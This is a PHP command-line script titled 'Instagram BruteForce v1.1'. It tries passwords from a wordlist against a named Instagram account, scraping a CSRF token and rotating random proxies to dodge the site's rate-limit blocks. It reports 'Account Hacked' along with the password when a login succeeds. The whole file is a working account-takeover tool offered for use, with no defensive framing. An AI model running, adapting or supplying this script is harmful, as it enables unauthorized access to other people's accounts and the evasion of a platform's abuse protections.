<?php

error_reporting(0); // disable error reporting.

system('clear'); // clear the terminal.

echo "\033[32m[---------------------------------------]\n[ Instagram BruteForce v1.1 \033[0m By: Vinny!\033[32m ]\n\033[32m[---------------------------------------]\n\033[0m"; // author credits - do not remove!

/* Take arguments from terminal */
$username = $argv[1];
$passlist = $argv[2];
$proxies = $argv[3];

/* Check if the right parameters was entered */
if ($username == null || $passlist == null || $proxies == null) {
	exit("\n\033[31m[!] \033[0mUsage: php script.php username pass.txt proxies.txt \n\n");
}

/* Load Password List */
$pass_get = file_get_contents($passlist); // get passwords from the list
$passwords = explode ("\n", $pass_get); // explode passwords to work with each line

/* Load Proxies List */
$proxies = file($proxies);

/* Check if username is registered on instagram */
$getuser = file_get_contents("https://www.instagram.com/$username/?__a=1");
$response_cod = $http_response_header[0];
$response_cod == "HTTP/1.1 404 Not Found" ? exit("\n\033[31m[!] \033[0mThe username [$username] is not registered on Instagram! \n\n") : '';

/* Check if loaded lists exist */
$pass_get == null ? exit("\n\033[31m[!] \033[0mPassword list is empty or doesn't exist, add some passwords to it! \n\n") : ''; // check if pass list contains passwords
$proxies == null ? exit("\n\033[31m[!] \033[0mProxy list is empty or doesn't exist, the script won't work without proxies! \n\n") : ''; // check if proxy list contains proxies

echo "\n\033[32m[!]\033[0m Password and Proxy list loaded succesfully! \n";
echo "\n\033[32m[!]\033[0m ".count($passwords)." passwords have been loaded. \n";
echo "\n\033[32m[!]\033[0m Starting the attack...\n\n";

if (file_exists("cookie.txt")) { unlink("cookie.txt"); } // delete cookie if it exists.

$loaded = count($passwords);
$current = 1;

/* Start The Bruteforce attack */
foreach ($passwords as $password) {

	$status = "fail"; // key to get into the while. ;)

	while ($status == "fail") {

		// sleep(3); // seconds to wait before each attempt.

		/* Check if Password is at least 6 characters */
		if (strlen($password) < 6) {
			echo "\033[36m[!]\033[0m [".$current."/".$loaded."] Password Shorter Than 6 Characters [$password] \n";
			$current++;
			break;
		}
	
		$proxy = $proxies[array_rand($proxies)]; // get a proxy randomly from the list.
	
		/* Load Main Page and get CSRF Token */
		$curl = curl_init();
		curl_setopt_array($curl, array(
		  CURLOPT_URL => "https://www.instagram.com/",

		  CURLOPT_PROXY => $proxy, // set random proxy.
		  // CURLOPT_PROXYUSERPWD => "user:password", #if your proxy needs authentication..

		  CURLOPT_COOKIEJAR => "cookie.txt",
		  CURLOPT_COOKIEFILE => "cookie.txt",
		  CURLOPT_RETURNTRANSFER => true,
		  CURLOPT_FOLLOWLOCATION => true,
		  CURLOPT_HEADER => true,
		  CURLOPT_MAXREDIRS => 10,
		  CURLOPT_TIMEOUT => 30,
		  CURLOPT_CUSTOMREQUEST => "GET",
		  CURLOPT_HTTPHEADER => array(
		    "cache-control: no-cache",
		    "upgrade-insecure-requests: 1",
		    "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0"
		  ),
		));
		$response = curl_exec($curl);
		curl_close($curl);	
	
		preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $response, $matches);
		$cookies = array();
		foreach($matches[1] as $item) {
		    parse_str($item, $cookie);
		    $cookies = array_merge($cookies, $cookie);
		}
	
		$csrf = $cookies['csrftoken'];

		/* Try to Sign Into the Account */
		$curl = curl_init();
		curl_setopt_array($curl, array(
		  CURLOPT_URL => "https://www.instagram.com/accounts/login/ajax/",

		  CURLOPT_PROXY => $proxy, // set random proxy.
		  // CURLOPT_PROXYUSERPWD => "user:password", #if your proxy needs authentication..

		  CURLOPT_COOKIEJAR => "cookie.txt",
		  CURLOPT_COOKIEFILE => "cookie.txt",
		  CURLOPT_RETURNTRANSFER => true,
		  CURLOPT_FOLLOWLOCATION => true,
		  CURLOPT_MAXREDIRS => 10,
		  CURLOPT_TIMEOUT => 30,
		  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
		  CURLOPT_POST => true,
		  CURLOPT_POSTFIELDS => "username=$username&password=$password",
		  CURLOPT_HTTPHEADER => array(
		    "cache-control: no-cache",
		    "content-type: application/x-www-form-urlencoded",
		    "referer: https://www.instagram.com/",
		    "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0",
		    "x-csrftoken: $csrf",
		    "x-instagram-ajax: 1",
		    "x-requested-with: XMLHttpRequest"
		  ),
		));	
		$response = curl_exec($curl);
		$err = curl_error($curl);	
		curl_close($curl);

		/* Check Result */
		$json_o = json_decode($response);
		$status = $json_o->status;

		if ($json_o->message == "checkpoint_required") {
			echo "\n\033[32m[Success!]\033[0m Account Hacked [Username: \033[36m$username \033[0m| Password: \033[36m$password\033[0m] \n\n";
			exit("\033[33mThe account has a checkpoint, it's necessary to receive a code through SMS or E-mail.\033[0m \n\n");
		} elseif ($status == "fail") {
			echo "\033[33m[!]\033[0m The proxy [".str_replace("\n", "", $proxy)."] has been temporary blocked, trying with another one... \n";
		} elseif ($json_o->authenticated == true) {
			echo "\n\033[32m[Success!]\033[0m Account Hacked [Username: \033[36m$username \033[0m| Password: \033[36m$password\033[0m] \n\n"; // success! :D
			exit("Proxy used to authenticate: \033[36m".str_replace("\n", "", $proxy)."\033[0m \n\n");
		} else {
			echo "\033[31m[!]\033[0m [".$current."/".$loaded."] Password Incorrect [$password] \n";
		}

		$current++;
	
		unlink("cookie.txt"); // remove the old cookie.

	}

}

	    echo "\n\033[31mOh no!\033[0m The password for the account [$username] is not in the list! :( \n\n";